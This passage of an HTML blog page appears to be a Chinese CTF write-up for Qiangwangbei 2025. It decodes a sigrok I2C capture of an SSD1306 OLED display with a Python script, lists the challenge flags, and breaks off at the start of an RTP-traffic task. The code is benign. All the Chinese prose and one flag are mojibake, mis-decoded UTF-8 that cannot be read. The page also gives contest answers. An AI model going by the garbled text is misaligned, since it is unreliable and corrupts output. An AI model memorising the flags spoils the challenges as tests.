	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/2_hu_c40ffe619ff906bb.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/2_hu_7c5af0132ca55e70.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="215"
		data-flex-basis="517px"
	
></p>
<h4 id="flag-2">flag
</h4><p>flag{æˆ‘å·²çŸ¥æ™“ï¼Œå¹¶ä¼šè®¤çœŸæ’°å†™wpï¼}</p>
<h3 id="legacyoled">legacyOLED
</h3><h4 id="è§£é¢˜æ€è·¯-2">è§£é¢˜æ€è·¯
</h4><p>sr æ–‡ä»¶æ˜¯ zip æ–‡ä»¶ï¼ˆç”¨010editoråˆ†æå°±å¯ä»¥çœ‹åˆ°ï¼Œ<code>504B</code>å‹ç¼©åŒ…æ–‡ä»¶å¤´æ ‡è¯†ï¼‰ï¼Œè§£å‹å‡ºæ¥ metadata çœ‹åˆ° <code>sigrok version=0.5.2</code>ï¼Œåœ¨ GitHub ä»¥ <code>oled sigrok </code>ä¸ºå…³é”®è¯æ‰¾åˆ°åŸé¢˜ <code>CTFSG 2022</code></p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/3.png"
	width="1719"
	height="254"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/3_hu_81c5cf491c83a065.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/3_hu_e9e304cda5050d2d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="676"
		data-flex-basis="1624px"
	
></p>
<p><a class="link" href="https://github.com/bobby-tables2/CTF-Archive/blob/main/CTFSG%202022/SIGINT/Writeup/SIGINT.md"  target="_blank" rel="noopener"
    >https://github.com/bobby-tables2/CTF-Archive/blob/main/CTFSG%202022/SIGINT/Writeup/SIGINT.md</a></p>
<p>åœ¨ sigrok å®˜ç½‘ä¸‹è½½ PulseViewï¼Œå°è¯•ä½¿ç”¨ IÂ²C è§£ç å™¨ï¼Œå¾—åˆ°æ•°æ®ä¸ä»¥ä¸ŠåŸé¢˜å¾ˆç›¸ä¼¼ï¼ŒåŸºæœ¬å¯ä»¥ç¡®è®¤æ˜¯ SSD1306</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/4.png"
	width="690"
	height="144"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/4_hu_29768b2469898236.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/4_hu_75b041bee3a7cec6.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="479"
		data-flex-basis="1150px"
	
></p>
<p>å¯¼å‡ºæ•°æ®ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Plain Text
</span></span><span class="line"><span class="cl">2257254-2257254 I2C: Address/Data: Start
</span></span><span class="line"><span class="cl">2257295-2257575 I2C: Address/Data: Address write: 3C
</span></span><span class="line"><span class="cl">2257575-2257615 I2C: Address/Data: Write
</span></span><span class="line"><span class="cl">2257615-2257655 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2257670-2257990 I2C: Address/Data: Data write: 00
</span></span><span class="line"><span class="cl">2257990-2258030 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2258030-2258350 I2C: Address/Data: Data write: 20
</span></span><span class="line"><span class="cl">2258350-2258390 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2258390-2258710 I2C: Address/Data: Data write: 01
</span></span><span class="line"><span class="cl">2258710-2258750 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2258792-2258792 I2C: Address/Data: Stop
</span></span><span class="line"><span class="cl">2258999-2258999 I2C: Address/Data: Start
</span></span><span class="line"><span class="cl">2259039-2259319 I2C: Address/Data: Address write: 3C
</span></span><span class="line"><span class="cl">2259319-2259359 I2C: Address/Data: Write
</span></span><span class="line"><span class="cl">2259359-2259399 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2259415-2259735 I2C: Address/Data: Data write: 00
</span></span><span class="line"><span class="cl">2259735-2259775 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2259775-2260095 I2C: Address/Data: Data write: 22
</span></span><span class="line"><span class="cl">2260095-2260135 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2260135-2260457 I2C: Address/Data: Data write: 03
</span></span><span class="line"><span class="cl">2260456-2260497 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2260496-2260816 I2C: Address/Data: Data write: 05
</span></span><span class="line"><span class="cl">2260816-2260856 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2260897-2260897 I2C: Address/Data: Stop
</span></span><span class="line"><span class="cl">2261079-2261079 I2C: Address/Data: Start
</span></span><span class="line"><span class="cl">2261119-2261399 I2C: Address/Data: Address write: 3C
</span></span><span class="line"><span class="cl">2261399-2261439 I2C: Address/Data: Write
</span></span><span class="line"><span class="cl">2261439-2261479 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2261495-2261815 I2C: Address/Data: Data write: 00
</span></span><span class="line"><span class="cl">2261815-2261855 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2261855-2262175 I2C: Address/Data: Data write: 21
</span></span><span class="line"><span class="cl">2262175-2262215 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2262215-2262535 I2C: Address/Data: Data write: 22
</span></span><span class="line"><span class="cl">2262535-2262575 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2262575-2262895 I2C: Address/Data: Data write: 3B
</span></span><span class="line"><span class="cl">2262895-2262935 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2262977-2262977 I2C: Address/Data: Stop
</span></span><span class="line"><span class="cl">2263226-2263226 I2C: Address/Data: Start
</span></span><span class="line"><span class="cl">2263267-2263547 I2C: Address/Data: Address write: 3C
</span></span><span class="line"><span class="cl">2263547-2263587 I2C: Address/Data: Write
</span></span><span class="line"><span class="cl">2263587-2263627 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2263665-2263985 I2C: Address/Data: Data write: 40
</span></span><span class="line"><span class="cl">2263985-2264025 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2264025-2264345 I2C: Address/Data: Data write: 00
</span></span><span class="line"><span class="cl">2264345-2264385 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2264385-2264705 I2C: Address/Data: Data write: 00
</span></span><span class="line"><span class="cl">2264705-2264745 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2264745-2265065 I2C: Address/Data: Data write: 00
</span></span><span class="line"><span class="cl">2265065-2265105 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2265105-2265425 I2C: Address/Data: Data write: 00
</span></span><span class="line"><span class="cl">2265425-2265465 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2265465-2265786 I2C: Address/Data: Data write: 00
</span></span><span class="line"><span class="cl">2265786-2265826 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2265826-2266146 I2C: Address/Data: Data write: 00
</span></span><span class="line"><span class="cl">2266146-2266186 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2266186-2266506 I2C: Address/Data: Data write: C0
</span></span><span class="line"><span class="cl">2266506-2266546 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2266546-2266866 I2C: Address/Data: Data write: 00
</span></span><span class="line"><span class="cl">2266866-2266906 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2266906-2267226 I2C: Address/Data: Data write: 00
</span></span><span class="line"><span class="cl">2267226-2267266 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2267266-2267586 I2C: Address/Data: Data write: E0
</span></span><span class="line"><span class="cl">2267586-2267626 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2267626-2267946 I2C: Address/Data: Data write: 01
</span></span><span class="line"><span class="cl">2267946-2267986 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2267986-2268306 I2C: Address/Data: Data write: 00
</span></span><span class="line"><span class="cl">2268306-2268346 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2268346-2268666 I2C: Address/Data: Data write: F8
</span></span><span class="line"><span class="cl">2268666-2268706 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">2268706-2269026 I2C: Address/Data: Data write: 07
</span></span><span class="line"><span class="cl">2269026-2269066 I2C: Address/Data: ACK
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ä»¥ä¸‹çœç•¥
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸åŒçš„æ˜¯ï¼Œæ ¹æ®æ ‡å‡†https://cdn-shop.adafruit.com/datasheets/SSD1306.pdfå¯çŸ¥ï¼Œæœ¬é¢˜æ—¢æœ‰æ¨ªå‘ç»˜å›¾ï¼Œåˆæœ‰çºµå‘ï¼Œå†™è„šæœ¬æå–æ•°æ®å¹¶ç»˜å›¾ã€‚ <a class="link" href="SSD1306.pdf" >SSD1306.pdf</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;export.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">filtered_lines</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span> <span class="k">if</span> <span class="s1">&#39;write: &#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;filtered.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">filtered_lines</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">groups</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">filtered_lines</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;Address write: 3C&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">tmp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">groups</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">tmp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">tmp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">groups</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">groups</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">canvas</span> <span class="o">=</span> <span class="p">[[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">128</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">horizontal</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl"><span class="n">page_start</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">page_end</span> <span class="o">=</span> <span class="mi">7</span>
</span></span><span class="line"><span class="cl"><span class="n">page</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">col_start</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">col_end</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl"><span class="n">col</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">group</span> <span class="ow">in</span> <span class="n">groups</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">match</span> <span class="n">group</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="p">[</span><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="n">horizontal</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="p">[</span><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="n">horizontal</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="p">[</span><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="n">col_l</span><span class="p">,</span> <span class="n">col_h</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="n">col_start</span> <span class="o">=</span> <span class="n">col_l</span>
</span></span><span class="line"><span class="cl">            <span class="n">col_end</span> <span class="o">=</span> <span class="n">col_h</span>
</span></span><span class="line"><span class="cl">            <span class="n">col</span> <span class="o">=</span> <span class="n">col_start</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="p">[</span><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="n">page_l</span><span class="p">,</span> <span class="n">page_h</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="n">page_start</span> <span class="o">=</span> <span class="n">page_l</span>
</span></span><span class="line"><span class="cl">            <span class="n">page_end</span> <span class="o">=</span> <span class="n">page_h</span>
</span></span><span class="line"><span class="cl">            <span class="n">page</span> <span class="o">=</span> <span class="n">page_start</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="p">[</span><span class="mh">0x40</span><span class="p">,</span> <span class="o">*</span><span class="n">data</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># col = col_start</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># page = page_start</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">page_start</span> <span class="o">&lt;=</span> <span class="n">page</span> <span class="o">&lt;=</span> <span class="n">page_end</span> <span class="ow">and</span> <span class="n">col_start</span> <span class="o">&lt;=</span> <span class="n">col</span> <span class="o">&lt;=</span> <span class="n">col_end</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">canvas</span><span class="p">[</span><span class="n">page</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">bit</span><span class="p">][</span><span class="n">col</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">&gt;&gt;</span> <span class="n">bit</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">horizontal</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">col</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">col</span> <span class="o">&gt;</span> <span class="n">col_end</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">col</span> <span class="o">=</span> <span class="n">col_start</span>
</span></span><span class="line"><span class="cl">                        <span class="n">page</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">page</span> <span class="o">&gt;</span> <span class="n">page_end</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="n">page</span> <span class="o">=</span> <span class="n">page_start</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">page</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">page</span> <span class="o">&gt;</span> <span class="n">page_end</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">page</span> <span class="o">=</span> <span class="n">page_start</span>
</span></span><span class="line"><span class="cl">                        <span class="n">col</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">col</span> <span class="o">&gt;</span> <span class="n">col_end</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="n">col</span> <span class="o">=</span> <span class="n">col_start</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">canvas</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;1&#39;</span> <span class="k">if</span> <span class="n">pixel</span> <span class="k">else</span> <span class="s1">&#39;0&#39;</span> <span class="k">for</span> <span class="n">pixel</span> <span class="ow">in</span> <span class="n">row</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>vscodeæ‰“å¼€çœ‹çœ‹ï¼š</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/5.png"
	width="690"
	height="557"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/5_hu_f5693763f0e47f28.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/5_hu_518b57171f33c177.png 1024w"
	loading="lazy"
	
		alt="å¼ºç½‘æ¯Logo"
	
	
		class="gallery-image" 
		data-flex-grow="123"
		data-flex-basis="297px"
	
></p>
<p>æ¯ 8 ä½çš„æœ€é«˜ä½æ˜¯ 0ï¼ŒçŒœæµ‹ä¸º ASCII</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/6.png"
	width="690"
	height="285"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/6_hu_e61d2d940bbbecd8.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/6_hu_9b17e193360753c7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="581px"
	
></p>
<p>å½“ç„¶è¿™ä¸ªæ˜¯èµ›åšå¨å­ï¼Œä½ ç”¨å±±ç¾Špuzzlesolverä¹Ÿè¡Œã€‚</p>
<h4 id="flag-3">flag
</h4><p>qwb{Re41_Ma5te7-O5-S5Dl3o6_12C}</p>
<h3 id="è°å½±é‡é‡60">è°å½±é‡é‡6.0
</h3><p>WMCTF2025 RTPæµé‡</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/7.png"
	width="690"
	height="404"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/7_hu_20afb13dacdce6c2.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/7_hu_4b32e1178e25d188.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="170"
		data-flex-basis="409px"
	
></p>
<p>ä¸ŠPythonä»£ç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
